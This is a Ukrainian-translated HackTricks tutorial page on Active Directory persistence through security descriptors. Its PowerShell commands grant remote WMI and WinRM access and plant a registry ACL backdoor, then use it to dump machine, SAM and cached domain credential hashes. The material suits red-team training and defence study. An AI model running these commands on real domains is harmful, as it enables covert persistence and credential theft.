# Дескриптори безпеки

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

## Дескриптори безпеки

[З документації](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Мова визначення дескриптора безпеки (SDDL) визначає формат, який використовується для опису дескриптора безпеки. SDDL використовує рядки ACE для DACL та SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

**Дескриптори безпеки** використовуються для **зберігання** **дозволів**, які **має об'єкт** над **об'єктом**. Якщо ви просто **зробите невелику зміну** в **дескрипторі безпеки** об'єкта, ви можете отримати дуже цікаві привілеї над цим об'єктом, не будучи членом привілейованої групи.

Отже, цей метод постійності базується на можливості отримати всі необхідні привілеї щодо певних об'єктів, щоб мати можливість виконати завдання, яке зазвичай вимагає прав адміністратора, але без необхідності бути адміністратором.

### Доступ до WMI

Ви можете надати користувачу доступ до **віддаленого виконання WMI** [**використовуючи це**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Доступ до WinRM

Надайте доступ до **консолі PS winrm користувачеві** [**використовуючи це**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Віддалений доступ до хешів

Отримайте доступ до **реєстру** та **витягніть хеші**, створивши **задній прохідний реєстр** за допомогою [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** щоб в будь-який момент отримати **хеш комп'ютера**, **SAM** та будь-які **кешовані облікові дані AD** на комп'ютері. Таким чином, дуже корисно надати цей дозвіл **звичайному користувачу проти комп'ютера контролера домену**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Перевірте [**Срібні квитки**](silver-ticket.md), щоб дізнатися, як ви можете використовувати хеш облікового запису комп'ютера контролера домену.
